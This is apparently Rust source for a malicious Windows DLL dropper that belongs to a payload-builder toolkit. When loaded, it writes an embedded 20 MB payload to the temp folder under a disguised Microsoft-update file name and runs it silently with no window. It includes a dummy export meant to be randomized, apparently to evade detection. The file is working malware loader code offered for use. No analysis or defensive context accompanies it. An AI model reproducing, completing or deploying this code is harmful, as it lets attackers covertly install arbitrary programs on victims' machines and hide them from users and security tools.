use std::fs::File;
use std::io::Write;
use std::os::windows::process::CommandExt;
use std::process::Command;
use std::thread;
use winapi::um::winnt::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH};
use winapi::shared::minwindef::{HINSTANCE, DWORD, LPVOID, BOOL, TRUE};

// This will be patched by the builder
// 20MB buffer for the client payload
#[link_section = ".payload"]
static PAYLOAD: [u8; 20 * 1024 * 1024] = {
    let mut b = [0u8; 20 * 1024 * 1024];
    let marker = b"PAYLOAD_MARKER_PLACEHOLDER";
    let mut i = 0;
    while i < marker.len() {
        b[i] = marker[i];
        i += 1;
    }
    b
};

const CREATE_NO_WINDOW: u32 = 0x08000000;

fn run_payload() {
    let mut temp_path = std::env::temp_dir();
    let payload_name = format!("ms_upd_{}.exe", std::process::id());
    temp_path.push(payload_name);

    if !temp_path.exists() {
        if let Ok(mut file) = File::create(&temp_path) {
            let _ = file.write_all(&PAYLOAD);
            let _ = file.flush();
            drop(file);
        }
    }

    if temp_path.exists() {
        let _ = Command::new(&temp_path)
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
    }
}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
pub extern "system" fn DllMain(
    hinst_dll: HINSTANCE,
    fdw_reason: DWORD,
    lpv_reserved: LPVOID,
) -> BOOL {
    if fdw_reason == DLL_PROCESS_ATTACH {
        thread::spawn(|| {
            run_payload();
        });
    }
    TRUE
}

// Dummy export to be randomized
#[no_mangle]
pub extern "C" fn ReflectiveInit() {
    // This exists to provide an export for the DLL
}
